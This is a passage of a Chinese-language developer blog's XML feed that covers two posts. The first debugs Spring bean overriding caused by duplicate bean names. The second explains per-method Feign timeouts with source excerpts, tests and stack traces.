class="line"><span class="keyword">return</span> resolveManagedSet(argName, (Set&lt;?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedMap) &#123;</span><br><span class="line"><span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line"><span class="keyword">return</span> resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedProperties) &#123;</span><br><span class="line">Properties original = (Properties) value;</span><br><span class="line">Properties copy = <span class="keyword">new</span> Properties();</span><br><span class="line">original.forEach((propKey, propValue) -&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (propKey <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">propKey = evaluate((TypedStringValue) propKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (propValue <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">propValue = evaluate((TypedStringValue) propValue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (propKey == <span class="keyword">null</span> || propValue == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error converting Properties key/value pair for "</span> + argName + <span class="string">": resolved to null"</span>);</span><br><span class="line">&#125;</span><br><span class="line">copy.put(propKey, propValue);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line"><span class="comment">// Convert value to target type here.</span></span><br><span class="line">TypedStringValue typedStringValue = (TypedStringValue) value;</span><br><span class="line">Object valueObject = evaluate(typedStringValue);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);</span><br><span class="line"><span class="keyword">if</span> (resolvedTargetType != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> valueObject;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="comment">// Improve the message by showing the context.</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line"><span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line"><span class="string">"Error converting typed String value for "</span> + argName, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> NullBean) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> evaluate(value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>debug看了下，也确实是对的：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429120415453.png"><p>跟进去， 发现：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429120839555.png"><p>老的dao层关联的sessionFactory居然是新的（扫描路径不一样，这里只加载了新的mapper文件）。根据名称获取一把：</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429121457725.png"><h2 id="bean注册"><a href="#bean注册" class="headerlink" title="bean注册"></a>bean注册</h2><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125600021.png"><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125633517.png"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// Implementation of BeanDefinitionRegistry interface</span></span><br><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> BeanDefinitionStoreException </span>&#123;</span><br><span class="line"></span><br><span class="line">Assert.hasText(beanName, <span class="string">"Bean name must not be empty"</span>);</span><br><span class="line">Assert.notNull(beanDefinition, <span class="string">"BeanDefinition must not be null"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (beanDefinition <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">((AbstractBeanDefinition) beanDefinition).validate();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line"><span class="string">"Validation of bean definition failed"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里发生了覆盖</span></span><br><span class="line">BeanDefinition existingDefinition = <span class="keyword">this</span>.beanDefinitionMap.get(beanName);</span><br><span class="line"><span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!isAllowBeanDefinitionOverriding()) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line"><span class="string">"Cannot register bean definition ["</span> + beanDefinition + <span class="string">"] for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"': There is already ["</span> + existingDefinition + <span class="string">"] bound."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;</span><br><span class="line"><span class="comment">// e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE</span></span><br><span class="line"><span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">logger.warn(<span class="string">"Overriding user-defined bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with a framework-generated bean definition: replacing ["</span> +</span><br><span class="line">existingDefinition + <span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!beanDefinition.equals(existingDefinition)) &#123;</span><br><span class="line">        <span class="comment">// 走到了这里，打印了override的日志，不过是info级别的</span></span><br><span class="line"><span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">logger.info(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with a different definition: replacing ["</span> + existingDefinition +</span><br><span class="line"><span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line"><span class="string">"' with an equivalent definition: replacing ["</span> + existingDefinition +</span><br><span class="line"><span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (hasBeanCreationStarted()) &#123;</span><br><span class="line"><span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line"><span class="keyword">synchronized</span> (<span class="keyword">this</span>.beanDefinitionMap) &#123;</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">List&lt;String&gt; updatedDefinitions = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.beanDefinitionNames.size() + <span class="number">1</span>);</span><br><span class="line">updatedDefinitions.addAll(<span class="keyword">this</span>.beanDefinitionNames);</span><br><span class="line">updatedDefinitions.add(beanName);</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionNames = updatedDefinitions;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.manualSingletonNames.contains(beanName)) &#123;</span><br><span class="line">Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> LinkedHashSet&lt;&gt;(<span class="keyword">this</span>.manualSingletonNames);</span><br><span class="line">updatedSingletons.remove(beanName);</span><br><span class="line"><span class="keyword">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Still in startup registration phase</span></span><br><span class="line"><span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line"><span class="keyword">this</span>.beanDefinitionNames.add(beanName);</span><br><span class="line"><span class="keyword">this</span>.manualSingletonNames.remove(beanName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.frozenBeanDefinitionNames = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span> || containsSingleton(beanName)) &#123;</span><br><span class="line">resetBeanDefinition(beanName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125804639.png"><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>最终排查下来，发现只是bean的名称重复，导致覆盖；跟<code>@Primary</code>没有关系。在成文的过程中又一起<strong>不加思索地复制粘贴</strong>引起的故障</p><img src="/2020/04/29/spring-bean-duplic-name/image-20200429130442650.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of <span class="built_in">type</span> <span class="string">'com.atour.pay.api.remote.statistics.TransStatisticsRemote'</span> available</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:347)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:334)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1103)</span><br></pre></td></tr></table></figure><p>还是需要保持敬畏之心，多去了解，不能无脑的粘贴。同时我们的基础建设不够完善，才导致了这么多复制粘贴的代码，道阻且长！</p><p>覆盖的规则可以参考， <a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a>, 这里简单贴下结论：</p><blockquote><ul><li>同一个配置文件内同名的<code>Bean</code>，<strong>以最上面定义的为准</strong></li><li>不同配置文件中存在同名Bean，<code>后解析</code>的配置文件会覆盖<code>先解析</code>的配置文件（配置文件的先后顺序其实会受到<code>@Order</code>来控制）</li><li>通过<code>@ComponentScan</code>扫描进来的优先级是最低的，原因就是它扫描进来的Bean定义是<strong>最先</strong>被注册的~</li><li>在不同容器内，即使<code>Bean</code>名称相同，它们也是能够<strong>和谐共存</strong>的（想想父子容器）</li></ul></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.iflym.com/index.php/code/201208290002.html" rel="external nofollow noopener noreferrer" target="_blank">Spring中获取一个bean的流程-2 – i flym</a></li><li><a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="spring-bean" scheme="http://qsli.github.io/tags/spring-bean/"/>
    
  </entry>
  
  <entry>
    <title>Feign方法级别的超时</title>
    <link href="http://qsli.github.io/2020/04/28/feign-method-timeout/"/>
    <id>http://qsli.github.io/2020/04/28/feign-method-timeout/</id>
    <published>2020-04-28T06:00:44.000Z</published>
    <updated>2020-05-09T15:23:17.375Z</updated>
    
    <content type="html"><![CDATA[<img src="/2020/04/28/feign-method-timeout/image-20200428135947174.png"><h2 id="Feign方法级别的超时"><a href="#Feign方法级别的超时" class="headerlink" title="Feign方法级别的超时"></a>Feign方法级别的超时</h2><ul><li><p>discussion</p><p><a href="https://github.com/OpenFeign/feign/issues/562" rel="external nofollow noopener noreferrer" target="_blank">Per request timeout options · Issue #562 · OpenFeign/feign</a></p></li><li><p>版本 &gt;= 10.3.0</p></li></ul><img src="/2020/04/28/feign-method-timeout/WeChatWorkScreenshot_cb1954f6-abee-48ad-8dc5-14e9ef579bb9.png"><ul><li>源码中的单测：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pengfei.zhao</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">interface</span> <span class="title">OptionsInterface</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="comment">// 参数中多了一个超时的配置</span></span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">(Request.Options options)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Rule</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> ExpectedException thrown = ExpectedException.none();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 测试总的配置会导致超时</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">socketTimeoutTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    thrown.expect(FeignException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    thrown.expectCause(CoreMatchers.isA(SocketTimeoutException<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line"></span><br><span class="line">    api.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 接口级别的配置可以覆盖总的配置，从而在等待3s之后拿到结果</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">normalResponseTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    assertThat(api.get(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">4</span> * <span class="number">1000</span>))).isEqualTo(<span class="string">"foo"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部分源码"><a href="#部分源码" class="headerlink" title="部分源码"></a>部分源码</h3><p>版本：<code>10.10.1</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// feign.SynchronousMethodHandler#invoke</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object[] argv)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    RequestTemplate template = buildTemplateFromArgs.create(argv);</span><br><span class="line">    <span class="comment">// 从参数中找对应的option</span></span><br><span class="line">    Options options = findOptions(argv);</span><br><span class="line">    Retryer retryer = <span class="keyword">this</span>.retryer.clone();</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> executeAndDecode(template, options);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RetryableException e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          retryer.continueOrPropagate(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RetryableException th) &#123;</span><br><span class="line">          Throwable cause = th.getCause();</span><br><span class="line">          <span class="keyword">if</span> (propagationPolicy == UNWRAP &amp;&amp; cause != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> cause;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class="line">          logger.logRetry(metadata.configKey(), logLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>findOptions</code>的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options <span class="title">findOptions</span><span class="params">(Object[] argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argv == <span class="keyword">null</span> || argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.options;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Stream.of(argv)</span><br><span class="line">      .filter(Options.class::isInstance)</span><br><span class="line">      .map(Options.class::cast)</span><br><span class="line">      .findFirst()</span><br><span class="line">    <span class="comment">// fall back to总的超时</span></span><br><span class="line">      .orElse(<span class="keyword">this</span>.options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>如果使用<code>feign-ribbon</code>，版本要和<code>feign-core</code>保持一致，不然会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: url values must be not be absolute.</span><br><span class="line"></span><br><span class="line">at feign.RequestTemplate.uri(RequestTemplate.java:438)</span><br><span class="line">at feign.RequestTemplate.uri(RequestTemplate.java:425)</span><br><span class="line">at feign.RequestTemplate.append(RequestTemplate.java:392)</span><br><span class="line">at feign.ribbon.LBClient<span class="variable">$RibbonRequest</span>.toRequest(LBClient.java:100)</span><br><span class="line">at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:79)</span><br><span class="line">at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:38)</span><br><span class="line">at com.netflix.client.AbstractLoadBalancerAwareClient.buildLoadBalancerCommand(AbstractLoadBalancerAwareClient.java:127)</span><br><span class="line">at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:94)</span><br><span class="line">at feign.ribbon.RibbonClient.execute(RibbonClient.java:69)</span><br><span class="line">at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119)</span><br><span class="line">at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure><img src="/2020/04/28/feign-method-timeout/image-20200428135018581.png"><p><code>vip</code>没有解析出来，版本改了之后就没有问题了:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">feign-core.version</span>&gt;</span>10.10.1<span class="tag">&lt;/<span class="name">feign-core.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码里连接超时设置为100mills，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; effectiveMebIds =</span><br><span class="line">           personalMemberRemote.getEffectiveMebIds(<span class="keyword">new</span> Request.Options(<span class="number">100</span>, <span class="number">500</span>), Lists.newArrayList(<span class="number">1</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">1386232841</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.l.DynamicServerListLoadBalancer-179  - Setting server list <span class="keyword">for</span> zones: &#123;defaultzone=[192.168.16.211:10020]&#125;</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG 